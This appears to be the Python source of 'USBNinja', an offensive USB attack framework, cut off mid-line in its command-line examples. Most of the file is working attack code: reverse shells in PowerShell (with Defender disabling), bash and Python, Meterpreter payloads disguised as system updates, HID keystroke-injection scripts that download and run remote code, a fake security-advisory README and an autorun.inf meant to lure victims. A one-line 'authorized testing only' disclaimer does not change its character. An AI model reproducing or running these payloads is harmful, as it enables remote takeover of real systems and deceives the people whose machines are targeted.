!/usr/bin/env python3
"""
USBNinja v2.0 - Advanced USB Attack Automation Framework
Metasploit-Integrated Payload Generation & Deployment

For authorized penetration testing only.
"""

import os
import sys
import json
import time
import shutil
import hashlib
import argparse
import subprocess
import threading
import base64
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import re

# ═══════════════════════════════════════════════════════════
# COLOR SCHEME - Metasploit Style
# ═══════════════════════════════════════════════════════════

class Style:
    """Metasploit-inspired color scheme"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    
    # Metasploit specific
    MSF_RED = '\033[38;5;196m'
    MSF_BLUE = '\033[38;5;33m'
    MSF_GREEN = '\033[38;5;82m'
    MSF_YELLOW = '\033[38;5;226m'
    MSF_ORANGE = '\033[38;5;208m'
    MSF_PURPLE = '\033[38;5;141m'
    
    @staticmethod
    def success(text): 
        return f"{Style.MSF_GREEN}[+]{Style.END} {text}"
    
    @staticmethod
    def error(text): 
        return f"{Style.MSF_RED}[-]{Style.END} {text}"
    
    @staticmethod
    def info(text): 
        return f"{Style.MSF_BLUE}[*]{Style.END} {text}"
    
    @staticmethod
    def warning(text): 
        return f"{Style.MSF_YELLOW}[!]{Style.END} {text}"
    
    @staticmethod
    def resource(text): 
        return f"{Style.MSF_PURPLE}[~]{Style.END} {text}"
    
    @staticmethod
    def prompt(text): 
        return f"{Style.MSF_ORANGE}[?]{Style.END} {text}"

# ═══════════════════════════════════════════════════════════
# ASCII ART & BANNERS
# ═══════════════════════════════════════════════════════════

MSF_BANNER = f"""{Style.MSF_RED}
                                                  
      =[ {Style.BOLD}USBNinja v2.0 - Enhanced{Style.END}{Style.MSF_RED}        ]
+ -- --=[ {Style.END}USB Attack Automation Framework{Style.MSF_RED}    ]
+ -- --=[ {Style.END}Metasploit Integration Layer{Style.MSF_RED}       ]
+ -- --=[ {Style.END}Multi-Platform Payload Builder{Style.MSF_RED}     ]
      =[ {Style.END}For Authorized Testing Only{Style.MSF_RED}         ]
                                                  
{Style.END}"""

NINJA_ASCII = f"""{Style.MSF_PURPLE}
        /\\
       /  \\         {Style.MSF_ORANGE}USB{Style.MSF_PURPLE}
      / /\\ \\        {Style.MSF_ORANGE}NINJA{Style.MSF_PURPLE}
     / /  \\ \\    
    /_/____\\_\\   {Style.DIM}Silent. Deadly. Effective.{Style.END}
{Style.END}"""

def print_banner():
    """Display Metasploit-style startup banner"""
    import random
    banners = [MSF_BANNER, NINJA_ASCII]
    print(random.choice(banners))
    print(f"{Style.DIM}{'─' * 60}{Style.END}\n")

def print_status(message: str, status: str = "info"):
    """Print formatted status message"""
    status_map = {
        'success': Style.success,
        'error': Style.error,
        'info': Style.info,
        'warning': Style.warning,
        'resource': Style.resource,
        'prompt': Style.prompt
    }
    func = status_map.get(status, Style.info)
    print(func(message))

# ═══════════════════════════════════════════════════════════
# PROGRESS & ANIMATION
# ═══════════════════════════════════════════════════════════

class ProgressBar:
    """Metasploit-style progress indicator"""
    def __init__(self, total: int, desc: str = "Processing"):
        self.total = total
        self.current = 0
        self.desc = desc
        self.start_time = time.time()
        
    def update(self, amount: int = 1):
        self.current += amount
        percent = (self.current / self.total) * 100
        filled = int(percent / 2)
        bar = '█' * filled + '░' * (50 - filled)
        
        elapsed = time.time() - self.start_time
        rate = self.current / elapsed if elapsed > 0 else 0
        
        sys.stdout.write(f'\r{Style.MSF_BLUE}[*]{Style.END} {self.desc}: [{bar}] {percent:.1f}% ({rate:.1f}/s)')
        sys.stdout.flush()
        
        if self.current >= self.total:
            print()
    
    def finish(self):
        self.current = self.total
        self.update(0)

# ═══════════════════════════════════════════════════════════
# METASPLOIT INTEGRATION
# ═══════════════════════════════════════════════════════════

class MetasploitInterface:
    """Interface to Metasploit Framework"""
    
    def __init__(self):
        self.handlers = []
        self.sessions = []
        
    def generate_payload(self, payload_type: str, lhost: str, lport: int,
                        output_path: Path, format_type: str, 
                        encoder: str = None, iterations: int = 3) -> bool:
        """Generate payload using msfvenom"""
        print_status(f"Generating {payload_type} payload...", "info")
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format_type,
            '-o', str(output_path)
        ]
        
        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations)])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                print_status(f"Payload saved: {output_path.name}", "success")
                return True
            else:
                print_status(f"Generation failed: {result.stderr}", "error")
                return False
        except subprocess.TimeoutExpired:
            print_status("Payload generation timed out", "error")
            return False
        except Exception as e:
            print_status(f"Exception: {e}", "error")
            return False
    
    def create_handler_rc(self, handlers: List[Dict], output_path: Path) -> bool:
        """Generate multi-handler resource script"""
        print_status("Creating Metasploit handler resource script...", "info")
        
        rc_content = f"""# USBNinja Multi-Handler Resource Script
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

banner
setg PROMPT "msf6 %clrred(USBNinja)%clr > "
setg LOGLEVEL 2

"""
        
        for idx, handler in enumerate(handlers):
            rc_content += f"""
# Handler {idx + 1}: {handler['name']}
use exploit/multi/handler
set PAYLOAD {handler['payload']}
set LHOST {handler['lhost']}
set LPORT {handler['lport']}
set ExitOnSession false
set EnableStageEncoding true
exploit -j -z

"""
        
        rc_content += """
# Display status
jobs -v
sessions -l

echo ""
echo "\\033[1;32m[+]\\033[0m USBNinja handlers active"
echo "\\033[1;33m[!]\\033[0m Waiting for connections..."
echo ""
"""
        
        try:
            output_path.write_text(rc_content)
            print_status(f"Handler script created: {output_path.name}", "success")
            return True
        except Exception as e:
            print_status(f"Failed to create handler script: {e}", "error")
            return False

# ═══════════════════════════════════════════════════════════
# SMART PAYLOAD BUILDER
# ═══════════════════════════════════════════════════════════

class SmartPayloadBuilder:
    """Intelligent payload generation with evasion techniques"""
    
    def __init__(self, msf: MetasploitInterface):
        self.msf = msf
        
    def build_windows_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build comprehensive Windows payload suite"""
        print_status("Building Windows payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(5, "Windows payloads")
        
        # 1. Standard EXE
        exe_path = output_dir / "WindowsUpdate.exe"
        if self.msf.generate_payload(
            'windows/meterpreter/reverse_tcp',
            lhost, lport, exe_path, 'exe',
            encoder='x86/shikata_ga_nai', iterations=5
        ):
            payloads['exe'] = exe_path
        progress.update()
        
        # 2. DLL
        dll_path = output_dir / "SecurityUpdate.dll"
        if self.msf.generate_payload(
            'windows/meterpreter/reverse_tcp',
            lhost, lport, dll_path, 'dll'
        ):
            payloads['dll'] = dll_path
        progress.update()
        
        # 3. PowerShell script
        ps1_path = output_dir / "invoke.ps1"
        ps_script = self._generate_ps_script(lhost, lport)
        ps1_path.write_text(ps_script)
        payloads['ps1'] = ps1_path
        progress.update()
        
        # 4. HTA file
        hta_path = output_dir / "update.hta"
        hta_content = self._generate_hta(lhost, lport)
        hta_path.write_text(hta_content)
        payloads['hta'] = hta_path
        progress.update()
        
        # 5. Batch launcher
        bat_path = output_dir / "install.bat"
        bat_content = f"""@echo off
title System Update
cd /d %~dp0
start /min WindowsUpdate.exe
exit
"""
        bat_path.write_text(bat_content)
        payloads['bat'] = bat_path
        progress.update()
        
        progress.finish()
        print_status(f"Built {len(payloads)} Windows payloads", "success")
        return payloads
    
    def _generate_ps_script(self, lhost: str, lport: int) -> str:
        """Generate PowerShell payload"""
        ps_base = f"""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()}};$c.Close()"""
        
        encoded = base64.b64encode(ps_base.encode('utf-16le')).decode()
        
        return f"""# Security Update Script
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}
"""
    
    def _generate_hta(self, lhost: str, lport: int) -> str:
        """Generate HTA payload"""
        return f"""<html>
<head>
<title>Windows Security Update</title>
<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="SecurityUpdate" BORDER="none" SHOWINTASKBAR="no" SCROLL="no"/>
</head>
<body>
<script language="VBScript">
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -W Hidden -NoP -Exec Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/stage.ps1')""", 0, False
window.close()
</script>
</body>
</html>
"""
    
    def build_linux_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build Linux payload suite"""
        print_status("Building Linux payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(3, "Linux payloads")
        
        # 1. ELF binary
        elf_path = output_dir / "update_installer"
        if self.msf.generate_payload(
            'linux/x64/meterpreter/reverse_tcp',
            lhost, lport, elf_path, 'elf'
        ):
            elf_path.chmod(0o755)
            payloads['elf'] = elf_path
        progress.update()
        
        # 2. Bash script
        bash_path = output_dir / "install.sh"
        bash_script = f"""#!/bin/bash
# System Update Installer
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &
"""
        bash_path.write_text(bash_script)
        bash_path.chmod(0o755)
        payloads['bash'] = bash_path
        progress.update()
        
        # 3. Python payload
        py_path = output_dir / "updater.py"
        py_script = f"""#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
"""
        py_path.write_text(py_script)
        py_path.chmod(0o755)
        payloads['python'] = py_path
        progress.update()
        
        progress.finish()
        print_status(f"Built {len(payloads)} Linux payloads", "success")
        return payloads
    
    def build_macos_payloads(self, output_dir: Path, lhost: str, lport: int) -> Dict[str, Path]:
        """Build macOS payload suite"""
        print_status("Building macOS payload suite...", "info")
        payloads = {}
        
        progress = ProgressBar(2, "macOS payloads")
        
        # 1. Mach-O binary
        macho_path = output_dir / "Installer"
        if self.msf.generate_payload(
            'osx/x64/meterpreter/reverse_tcp',
            lhost, lport, macho_path, 'macho'
        ):
            macho_path.chmod(0o755)
            payloads['macho'] = macho_path
        progress.update()
        
        # 2. Shell script
        sh_path = output_dir / "install.sh"
        sh_script = f"""#!/bin/bash
# macOS System Update
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &
"""
        sh_path.write_text(sh_script)
        sh_path.chmod(0o755)
        payloads['shell'] = sh_path
        progress.update()
        
        progress.finish()
        print_status(f"Built {len(payloads)} macOS payloads", "success")
        return payloads

# ═══════════════════════════════════════════════════════════
# HID ATTACK GENERATOR
# ═══════════════════════════════════════════════════════════

class HIDAttackGenerator:
    """Generate BadUSB / HID injection attacks"""
    
    def __init__(self):
        self.platforms = {
            'rubber_ducky': self._generate_ducky,
            'bash_bunny': self._generate_bash_bunny,
            'digispark': self._generate_digispark
        }
    
    def generate_all(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate HID attacks for all platforms"""
        print_status("Generating HID injection attacks...", "info")
        
        for platform, generator in self.platforms.items():
            platform_dir = output_dir / platform
            platform_dir.mkdir(exist_ok=True, parents=True)
            generator(platform_dir, lhost, lport, targets)
        
        print_status(f"Generated HID attacks for {len(self.platforms)} platforms", "success")
    
    def _generate_ducky(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate Rubber Ducky scripts"""
        
        if 'windows' in targets:
            (output_dir / "windows.txt").write_text(f"""REM USBNinja - Windows Attack
DELAY 2000
GUI r
DELAY 500
STRING powershell -W Hidden -NoP -Exec Bypass
ENTER
DELAY 1500
STRING IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/w.ps1')
ENTER
""")
        
        if 'linux' in targets:
            (output_dir / "linux.txt").write_text(f"""REM USBNinja - Linux Attack
DELAY 1000
CTRL-ALT t
DELAY 500
STRING curl -s http://{lhost}:{lport}/l.sh|bash&
ENTER
""")
        
        if 'macos' in targets:
            (output_dir / "macos.txt").write_text(f"""REM USBNinja - macOS Attack
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl -s http://{lhost}:{lport}/m.sh|bash&
ENTER
""")
    
    def _generate_bash_bunny(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate Bash Bunny payloads"""
        
        payload = f"""#!/bin/bash
# USBNinja Bash Bunny Payload

LED R
ATTACKMODE HID STORAGE
LED Y

# Windows attack
Q GUI r
Q DELAY 500
Q STRING powershell -W Hidden
Q ENTER
Q DELAY 1000
Q STRING IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/w')
Q ENTER

LED G
"""
        (output_dir / "payload.txt").write_text(payload)
    
    def _generate_digispark(self, output_dir: Path, lhost: str, lport: int, targets: List[str]):
        """Generate DigiSpark Arduino sketch"""
        
        sketch = f"""/* USBNinja DigiSpark */
#include "DigiKeyboard.h"

void setup() {{
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(0);
  
  // Windows attack
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -W Hidden -NoP"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/w')"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}}

void loop() {{}}
"""
        (output_dir / "usbninja.ino").write_text(sketch)

# ═══════════════════════════════════════════════════════════
# SOCIAL ENGINEERING
# ═══════════════════════════════════════════════════════════

class SocialEngineeringDocs:
    """Generate convincing social engineering documents"""
    
    @staticmethod
    def create_all(docs_dir: Path):
        """Create all social engineering docs"""
        print_status("Creating social engineering documents...", "info")
        
        SocialEngineeringDocs._create_readme(docs_dir)
        SocialEngineeringDocs._create_autorun_inf(docs_dir.parent)
        
        print_status("Social engineering docs created", "success")
    
    @staticmethod
    def _create_readme(docs_dir: Path):
        readme = """
╔══════════════════════════════════════════════════════════════╗
║         CRITICAL SECURITY UPDATE - ACTION REQUIRED           ║
╚══════════════════════════════════════════════════════════════╝

SECURITY ADVISORY: CVE-2024-CRITICAL

This USB drive contains mandatory security patches addressing 
critical vulnerabilities discovered in recent security audits.

⚠️  IMMEDIATE ACTION REQUIRED  ⚠️

INSTALLATION INSTRUCTIONS:
═══════════════════════════════════════════════════════════════

💻 WINDOWS SYSTEMS:
   1. Run "WindowsUpdate.exe" as Administrator
   2. Accept User Account Control prompt
   3. Installation completes automatically

🐧 LINUX SYSTEMS:
   1. Open terminal in payloads directory
   2. Run: sudo ./update_installer
   3. Enter password when prompted

🍎 macOS SYSTEMS:
   1. Open "Installer" from payloads folder
   2. Right-click → Open (bypass Gatekeeper)
   3. Confirm installation

═══════════════════════════════════════════════════════════════
© 2024 IT Security Division. All rights reserved.
"""
        (docs_dir / "README.txt").write_text(readme)
    
    @staticmethod
    def _create_autorun_inf(root_dir: Path):
        autorun = """[autorun]
open=payloads\\WindowsUpdate.exe
icon=payloads\\WindowsUpdate.exe,0
action=Install Critical Security Update
label=Security Updates
"""
        (root_dir / "autorun.inf").write_text(autorun)

# ═══════════════════════════════════════════════════════════
# MAIN FRAMEWORK
# ═══════════════════════════════════════════════════════════

class USBNinja:
    """Main USBNinja framework controller"""
    
    def __init__(self):
        self.version = "2.0"
        self.msf = MetasploitInterface()
        self.builder = SmartPayloadBuilder(self.msf)
        self.hid = HIDAttackGenerator()
        self.config_dir = Path.home() / ".usbninja"
        self.log_file = self.config_dir / "usbninja.log"
        
        self.config_dir.mkdir(parents=True, exist_ok=True)
    
    def log(self, message: str):
        """Log to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    
    def check_dependencies(self) -> bool:
        """Check for required tools"""
        print_status("Checking dependencies...", "info")
        
        required = {
            'msfvenom': 'Metasploit Framework',
            'msfconsole': 'Metasploit Console',
            'python3': 'Python 3',
        }
        
        all_found = True
        for tool, desc in required.items():
            result = subprocess.run(['which', tool], capture_output=True)
            found = result.returncode == 0
            
            if found:
                print_status(f"{desc}: Found", "success")
            else:
                print_status(f"{desc}: Missing", "error")
                all_found = False
        
        return all_found
    
    def create_usb_bundle(self, output: str, lhost: str, lport: int, 
                         platforms: List[str], launch_handler: bool = True):
        """Create complete USB attack bundle"""
        
        print(f"\n{Style.BOLD}{'═' * 60}{Style.END}")
        print(f"{Style.BOLD}Creating USBNinja Attack Bundle{Style.END}")
        print(f"{Style.BOLD}{'═' * 60}{Style.END}\n")
        
        root = Path(output)
        root.mkdir(parents=True, exist_ok=True)
        
        # Create directory structure
        dirs = {
            'payloads': root / 'payloads',
            'hid': root / 'hid_attacks',
            'docs': root / 'docs',
        }
        
        for d in dirs.values():
            d.mkdir(exist_ok=True)
        
        # Generate payloads
        print(f"\n{Style.UNDERLINE}Phase 1: Payload Generation{Style.END}\n")
        
        handlers = []
        
        if 'windows' in platforms or 'all' in platforms:
            self.builder.build_windows_payloads(dirs['payloads'], lhost, lport)
            handlers.append({
                'name': 'Windows Meterpreter',
                'payload': 'windows/meterpreter/reverse_tcp',
                'lhost': lhost,
                'lport': lport
            })
        
        if 'linux' in platforms or 'all' in platforms:
            self.builder.build_linux_payloads(dirs['payloads'], lhost, lport)
            handlers.append({
                'name': 'Linux Meterpreter',
                'payload': 'linux/x64/meterpreter/reverse_tcp',
                'lhost': lhost,
                'lport': lport + 1
            })
        
        if 'macos' in platforms or 'all' in platforms:
            self.builder.build_macos_payloads(dirs['payloads'], lhost, lport)
            handlers.append({
                'name': 'macOS Meterpreter',
                'payload': 'osx/x64/meterpreter/reverse_tcp',
                'lhost': lhost,
                'lport': lport + 2
            })
        
        # Generate HID attacks
        print(f"\n{Style.UNDERLINE}Phase 2: HID Injection Attacks{Style.END}\n")
        target_os = ['windows', 'linux', 'macos'] if 'all' in platforms else platforms
        self.hid.generate_all(dirs['hid'], lhost, lport, target_os)
        
        # Create social engineering docs
        print(f"\n{Style.UNDERLINE}Phase 3: Social Engineering{Style.END}\n")
        SocialEngineeringDocs.create_all(dirs['docs'])
        
        # Create handler script
        print(f"\n{Style.UNDERLINE}Phase 4: Handler Configuration{Style.END}\n")
        handler_rc = root / "handler.rc"
        self.msf.create_handler_rc(handlers, handler_rc)
        
        # Create launcher script
        launcher = root / "start_handlers.sh"
        launcher_script = f"""#!/bin/bash
# USBNinja Handler Launcher

echo "{Style.MSF_BLUE}[*]{Style.END} Starting Metasploit handlers..."
echo "{Style.MSF_BLUE}[*]{Style.END} Listening on: {lhost}"
echo "{Style.MSF_BLUE}[*]{Style.END} Ports: {lport}-{lport+len(handlers)-1}"
echo ""

msfconsole -q -r handler.rc
"""
        launcher.write_text(launcher_script)
        launcher.chmod(0o755)
        
        # Print summary
        print(f"\n{Style.BOLD}{'═' * 60}{Style.END}")
        print(f"{Style.MSF_GREEN}[+] USBNinja bundle created successfully!{Style.END}")
        print(f"{Style.BOLD}{'═' * 60}{Style.END}\n")
        
        print(f"{Style.MSF_BLUE}[*]{Style.END} Location: {output}")
        print(f"{Style.MSF_BLUE}[*]{Style.END} Platforms: {', '.join(platforms)}")
        print(f"{Style.MSF_BLUE}[*]{Style.END} Handlers: {len(handlers)}")
        
        print(f"\n{Style.UNDERLINE}Next Steps:{Style.END}\n")
        print(f"  1. Copy bundle to USB drive")
        print(f"  2. Start handlers: {Style.CYAN}cd {output} && ./start_handlers.sh{Style.END}")
        print(f"  3. Insert USB into target system")
        print(f"  4. Wait for sessions...\n")

# ═══════════════════════════════════════════════════════════
# COMMAND LINE INTERFACE
# ═══════════════════════════════════════════════════════════

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='USBNinja - Advanced USB Attack Automation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Style.BOLD}Examples:{Style.END}

  Create full USB bundle:
    {Style.CYAN}./usbninja.py create --output /media/usb --lhost 192.168.1.100 --all{Style.END}
  
  Create for specific platforms:
    {Style.CYAN}./usbninja.py create -o ./usb -l 10.10.
